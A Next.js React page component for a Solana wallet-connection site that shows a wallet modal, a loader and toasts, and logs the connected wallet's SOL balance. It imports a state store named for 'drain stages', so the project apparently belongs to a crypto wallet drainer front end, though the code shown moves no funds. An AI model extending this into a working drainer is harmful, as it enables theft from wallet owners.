'use client'
import React , { useMemo  , useEffect} from "react";
import BodyLayout from "./layouts/BodyLayout";
import HeaderLayout from "./layouts/HeaderLayout";
import Button from "./components/ui/Button";
import WalletModel from "./components/common/modal/WalletModel";
import { executeCloseWallet } from "./services/redux/closeModel";
import { changeDrainStage } from "./services/redux/drainStages";
import { changeLoadingState } from "./services/redux/getLoadingState";
import Loader from "./components/common/loader";
import 'react-toastify/dist/ReactToastify.css';
import { ToastContainer } from "react-toastify";
import { connectionLevel } from "./constants/conneectionStages";
import { changeOpenBottomDrawer } from "./services/redux/drawerBottom";
import BottomDrawer from "./components/bottomdrawer";
import WalletConnection from "./components/common/wallet/WalletConnection";
import TestWallet from "./components/common/wallet/TestWallet";
import WalletConnect from "./services/providers/WalletConnect";
import {
  WalletDisconnectButton,
  WalletMultiButton,
} from "@solana/wallet-adapter-react-ui";
import { type Wallet, useWallet, type WalletContextState ,  useConnection } from '@solana/wallet-adapter-react';
import Navbar from "./components/common/Navbar";
import { awaitLoading } from "./services/hook/LoadingState";
import { LAMPORTS_PER_SOL } from "@solana/web3.js";
import { solanaConnection } from "./lib/solanahttps";
// import { getAllAccountTokens } from "./services/hook/getAllAccountTokens";
require("@solana/wallet-adapter-react-ui/styles.css");
const LOADER_ELAPSE_TIME = 5000;

export default function Home() {
  // const {connection } = useConnection();
  const connection = solanaConnection();
  const { select, wallets, publicKey, disconnect, connecting, connected , connect } = useWallet();

const closeWallet = executeCloseWallet((state)=>state.closeWallet)
const drainStage = changeDrainStage((state)=>state.connectionStage)
const loading = changeLoadingState((state)=>state.loading)
const resetLoader = changeLoadingState((state)=>state.resetLoadingState)
const openDrawer = changeOpenBottomDrawer((state)=>state.openBottomDrawer)
const resetOpenDrawer =  changeOpenBottomDrawer((state)=>state.resetOpenBottomDrawer)



useMemo(()=>{
  if(!loading)return;
   awaitLoading(LOADER_ELAPSE_TIME).then(()=>resetLoader(false))
},[loading])

useEffect(() => {
 (async()=>{
   if (!connection || !publicKey) {
     return;

   }
  
    //  await getAllAccountTokens(publicKey.toBase58(),connection);
     connection.onAccountChange(
     publicKey,
     (updatedAccountInfo) => {
       console.log(updatedAccountInfo.lamports);
     },
     "confirmed"
   );
  
   connection.getAccountInfo(publicKey).then((info) => {
     if (info) {
       console.log(info?.lamports ,LAMPORTS_PER_SOL);
     }
   });


 })()
 
}, [publicKey, connection]);





  return (
<div className="w-full flex justify-center items-center">
   <BodyLayout>
           <Navbar />
        {/* { closeWallet && <WalletConnection />}   */}
        {/* { closeWallet && <TestWallet/>}   */}
        { closeWallet && <WalletModel />}  
        { loading && <Loader /> }
        { openDrawer && <BottomDrawer />}
   </BodyLayout>
   <ToastContainer
        position="top-right"
        className="!z-[99999999]"
        autoClose={5000}
        hideProgressBar={true}
        newestOnTop={false}
        closeOnClick
        rtl={false}
        pauseOnFocusLoss
        draggable
        pauseOnHover
        theme="light"
        />
</div>   
  );
}
